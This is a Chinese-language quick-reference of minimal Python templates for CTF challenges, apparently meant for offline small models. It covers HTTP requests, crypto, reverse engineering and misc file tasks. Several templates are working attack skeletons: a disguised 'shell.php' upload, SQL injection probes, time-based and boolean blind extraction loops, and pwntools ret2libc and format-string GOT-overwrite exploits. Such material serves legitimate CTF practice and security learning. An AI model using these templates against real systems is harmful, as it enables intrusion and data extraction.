# Python 脚本模板速查

> 目标：给离线小模型提供“最小可改”的脚本骨架，而不是大而全框架。

---

## 1. requests 最小模板

```python
import requests
url = 'http://target/'
s = requests.Session()
r = s.get(url, timeout=5, allow_redirects=False)
print(r.status_code)
print(r.headers)
print(r.text[:500])
```

### GET / POST / JSON / 文件上传
```python
import requests
s = requests.Session()
print(s.get('http://target/', params={'id':'1'}).text)
print(s.post('http://target/login', data={'u':'a','p':'b'}).text)
print(s.post('http://target/api', json={'a':1}).text)
files = {'file': ('shell.php', b'<?php phpinfo();?>', 'image/jpeg')}
print(s.post('http://target/upload', files=files).text)
```

### 自定义 header / cookie / 代理
```python
import requests
proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
r = requests.get(
    'http://target/',
    headers={'User-Agent':'ctf', 'X-Forwarded-For':'127.0.0.1'},
    cookies={'session':'xxx'},
    proxies=proxies,
    verify=False,
    timeout=5,
)
print(r.text)
```

---

## 2. Web 爆破 / 差异检测模板

### 长度差异 / 关键词差异
```python
import requests
url = 'http://target/search'
base = requests.get(url, params={'q':'normal'}).text
for p in ["'", "' and 1=1 --+", "' and 1=2 --+"]:
    r = requests.get(url, params={'q':p}, timeout=5)
    print(p, len(r.text), 'error' in r.text.lower())
```

### 时间盲注模板
```python
import requests, time
url = 'http://target/'
for payload in ["1", "1 and sleep(3)"]:
    t = time.time()
    requests.get(url, params={'id':payload}, timeout=10)
    print(payload, time.time()-t)
```

### 二分枚举模板
```python
import requests, string
url = 'http://target/'
charset = string.ascii_letters + string.digits + '_{}-'
flag = ''
for i in range(1, 60):
    ok = False
    for ch in charset:
        payload = f"1' and substr((select database()),{i},1)='{ch}' --+"
        r = requests.get(url, params={'id':payload})
        if 'welcome' in r.text:
            flag += ch
            print(flag)
            ok = True
            break
    if not ok:
        break
```

---

## 3. pwntools 最小模板

### 本地 / 远程切换
```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

if args.REMOTE:
    io = remote('host', 1337)
else:
    io = process('./pwn')
    # gdb.attach(io, 'b *main')

io.sendlineafter(b'> ', b'1')
io.interactive()
```

### ret2libc 骨架
```python
from pwn import *
context.arch='amd64'
elf = ELF('./pwn')
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']

payload = flat(
    b'A'*offset,
    pop_rdi, puts_got,
    puts_plt,
    main,
)
```

### fmtstr 写入骨架
```python
from pwn import *
elf = ELF('./pwn')
io = process('./pwn')
payload = fmtstr_payload(6, {elf.got['printf']: elf.plt['system']})
io.sendline(payload)
io.interactive()
```

---

## 4. Crypto 最小模板

### base / xor / 频率
```python
import base64
from collections import Counter

s = 'SGVsbG8='
print(base64.b64decode(s))

def xor_bytes(a, k):
    return bytes([x ^ k[i % len(k)] for i, x in enumerate(a)])

c = bytes.fromhex('414243')
print(xor_bytes(c, b'K'))
print(Counter(c).most_common(10))
```

### 单字节异或爆破
```python
import string
c = bytes.fromhex('1b37373331363f78')
for k in range(256):
    p = bytes([x ^ k for x in c])
    score = sum(chr(i) in string.printable for i in p)
    if score > len(c) * 0.9:
        print(k, p)
```

### RSA 已知 p,q 解密
```python
from Crypto.Util.number import *
p, q, e = 0, 0, 65537
n = p*q
phi = (p-1)*(q-1)
d = inverse(e, phi)
m = pow(c, d, n)
print(long_to_bytes(m))
```

---

## 5. RE / 文件处理模板

### 批量 strings 提取可打印串
```python
data = open('file','rb').read()
cur = b''
for b in data:
    if 32 <= b < 127:
        cur += bytes([b])
    else:
        if len(cur) >= 4:
            print(cur.decode())
        cur = b''
```

### 简单解混淆 / 位运算复原
```python
def rol(x, n, bits=32):
    return ((x << n) | (x >> (bits-n))) & ((1<<bits)-1)

def ror(x, n, bits=32):
    return ((x >> n) | (x << (bits-n))) & ((1<<bits)-1)
```

---

## 6. Misc 模板

### 提取文件尾附加数据
```python
data = open('img.png', 'rb').read()
pos = data.find(b'IEND')
if pos != -1:
    tail = data[pos+8:]
    open('tail.bin', 'wb').write(tail)
    print('tail size =', len(tail))
```

### 扫描常见 base 编码串
```python
import re
s = open('text.txt','r',errors='ignore').read()
for pat in [r'[A-Za-z0-9+/=]{16,}', r'[0-9a-fA-F]{16,}', r'[A-Z2-7=]{16,}']:
    print('pattern:', pat)
    for x in re.findall(pat, s):
        print(x)
```

---

## 7. 使用建议
- 任何模板都先做 **最小化修改** 再运行。
- 脚本先打印：状态码、长度、头、关键文本片段。
- 盲注和爆破一定带：重试、超时、日志、断点保存。
- 不要把“大量逻辑”交给小模型临时生成，优先改现成骨架。
